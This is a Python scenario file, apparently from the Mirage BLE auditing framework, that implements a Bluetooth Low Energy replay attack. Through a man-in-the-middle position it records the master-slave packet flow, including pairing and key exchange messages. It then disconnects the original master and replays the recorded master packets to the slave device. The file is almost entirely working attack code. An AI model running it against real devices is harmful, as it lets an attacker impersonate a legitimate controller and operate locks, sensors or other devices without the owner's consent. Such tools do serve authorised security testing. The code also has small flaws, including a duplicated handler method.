from mirage.core import scenario
from mirage.libs import io, ble, utils
from mirage.libs.ble_utils.dissectors import *
from mirage.libs.ble_utils.sc_crypto import CryptoUtils


class ble_replay(scenario.Scenario):
    def onStart(self):
        self.packetFlow = []

        self.replay = False
        self.replayIndex = 0
        self.packetDelayed = False
        self.lastMasterPacket = None
        self.expectedSlavePacket = None

        self.responderAddress = None
        self.responderAddressType = None
        self.initiatorAddress = None
        self.initiatorAddressType = None

        self.module.printScenarioStart("Replay")
        # Success status of the scenario
        self.finished = False
        self.success = self.module.ScenarioResult.NOT

        io.ask(
            "First the packets are recorded: Press Enter to start, if all required packets are transfered press 's' to stop recording"
        )

    def onEnd(self, result):
        result["success"] = self.success
        result["finished"] = self.finished
        self.module.printScenarioEnd(result)
        return True

    def onKey(self, key):
        if key == "s":
            # Disconnect devices
            self.replay = True

            self.module.a2mEmitter.sendp(ble.BLEDisconnect())
            while self.module.a2sEmitter.isConnected():
                utils.wait(seconds=0.01)

        if key == "esc":
            self.module.setStage(self.module.BLEMitmStage.STOP)
        return True

    def slavePacket(self, packet):
        if self.replay:
            if self.replayIndex >= len(self.packetFlow):
                self.success = True
                self.finished = True
                self.module.setStage(self.module.BLEMitmStage.STOP)
                io.info("Replayed all packets")
            else:
                io.info("Slave: {}".format(packet))
                (masterPkt, slavePktType) = self.packetFlow[self.replayIndex]
                if not type(packet) == self.expectedSlavePacket:
                    # We have no idea what is happening :'(
                    # Just continue and hope for the best
                    io.info("Maybe something is wrong")
                io.info("Master: {}".format(masterPkt))
                if masterPkt:
                    self.module.a2sEmitter.sendp(masterPkt)
                self.expectedSlavePacket = slavePktType

                self.replayIndex += 1
            return False
        else:
            if self.lastMasterPacket:
                self.packetFlow.append((self.lastMasterPacket, type(packet)))
                self.lastMasterPacket = None
            else:
                self.packetFlow.append((None, type(packet)))
            return True

    def masterPacket(self, packet):
        if not self.replay:
            if self.lastMasterPacket:
                self.packetFlow.append((self.lastMasterPacket, None))
            self.lastMasterPacket = packet
            return True
        else:
            return False

    def onMasterDisconnect(self, packet):
        io.info("Master disconnected")
        io.ask(
            "Take care that original master is not interrupting replay. If ready start Replay with Enter"
        )

        self.module.a2sEmitter.sendp(ble.BLEDisconnect())
        while self.module.a2sEmitter.isConnected():
            utils.wait(seconds=0.01)

        self.module.connectOnSlave()

        (masterPkt, slavePktType) = self.packetFlow[self.replayIndex]

        io.info("{}".format(masterPkt))
        if masterPkt:
            self.module.a2sEmitter.sendp(masterPkt)
            self.expectedSlavePacket = slavePktType
        return False

    def onMasterExchangeMTURequest(self, packet):
        return self.masterPacket(packet)

    def onSlaveExchangeMTUResponse(self, packet):
        return self.slavePacket(packet)

    def onMasterWriteCommand(self, packet):
        return self.masterPacket(packet)

    def onMasterWriteRequest(self, packet):
        return self.masterPacket(packet)

    def onSlaveWriteResponse(self, packet):
        return self.slavePacket(packet)

    def onMasterReadBlobRequest(self, packet):
        return self.masterPacket(packet)

    def onSlaveReadBlobResponse(self, packet):
        return self.slavePacket(packet)

    def onMasterReadRequest(self, packet):
        return self.masterPacket(packet)

    def onSlaveReadResponse(self, packet):
        return self.slavePacket(packet)

    def onSlaveErrorResponse(self, packet):
        return self.slavePacket(packet)

    def onSlaveHandleValueNotification(self, packet):
        return self.slavePacket(packet)

    def onSlaveHandleValueIndication(self, packet):
        return self.slavePacket(packet)

    def onMasterHandleValueConfirmation(self, packet):
        return self.masterPacket(packet)

    def onMasterFindInformationRequest(self, packet):
        return self.masterPacket(packet)

    def onSlaveFindInformationResponse(self, packet):
        return self.slavePacket(packet)

    def onMasterFindByTypeValueRequest(self, packet):
        return self.masterPacket(packet)

    def onSlaveFindByTypeValueResponse(self, packet):
        return self.slavePacket(packet)

    def onMasterReadByTypeRequest(self, packet):
        return self.masterPacket(packet)

    def onMasterReadByGroupTypeRequest(self, packet):
        return self.masterPacket(packet)

    def onSlaveReadByTypeResponse(self, packet):
        return self.slavePacket(packet)

    def onSlaveReadByGroupTypeResponse(self, packet):
        return self.slavePacket(packet)

    def onMasterPairingRequest(self, packet):
        return self.masterPacket(packet)

    def onSlaveSecurityRequest(self, packet):
        return self.slavePacket(packet)

    def onSlavePairingResponse(self, packet):
        return self.slavePacket(packet)

    def onMasterPairingConfirm(self, packet):
        return self.masterPacket(packet)

    def onSlavePairingConfirm(self, packet):
        return self.slavePacket(packet)

    def onMasterPairingRandom(self, packet):
        return self.masterPacket(packet)

    def onSlavePairingRandom(self, packet):
        return self.slavePacket(packet)

    def onMasterPairingFailed(self, packet):
        return self.masterPacket(packet)

    def onSlavePairingFailed(self, packet):
        return self.slavePacket(packet)

    def onSlaveEncryptionInformation(self, packet):
        return self.slavePacket(packet)

    def onSlaveMasterIdentification(self, packet):
        return self.slavePacket(packet)

    def onSlaveIdentityAddressInformation(self, packet):
        return self.slavePacket(packet)

    def onSlaveIdentityInformation(self, packet):
        return self.slavePacket(packet)

    def onSlaveSigningInformation(self, packet):
        return self.slavePacket(packet)

    def onMasterEncryptionInformation(self, packet):
        return self.masterPacket(packet)

    def onMasterMasterIdentification(self, packet):
        return self.masterPacket(packet)

    def onMasterIdentityAddressInformation(self, packet):
        return self.masterPacket(packet)

    def onMasterMasterIdentification(self, packet):
        return self.masterPacket(packet)

    def onMasterSigningInformation(self, packet):
        return self.masterPacket(packet)

    def onSlavePublicKey(self, packet):
        return self.slavePacket(packet)

    def onMasterPublicKey(self, packet):
        return self.masterPacket(packet)

    def onSlaveConnectionParameterUpdateRequest(self, packet):
        return self.slavePacket(packet)

    def onMasterConnectionParameterUpdateResponse(self, packet):
        return self.masterPacket(packet)

    def onMasterDHKeyCheck(self, packet):
        return self.masterPacket(packet)

    def onSlaveDHKEyCheck(self, packet):
        return self.slavePacket(packet)
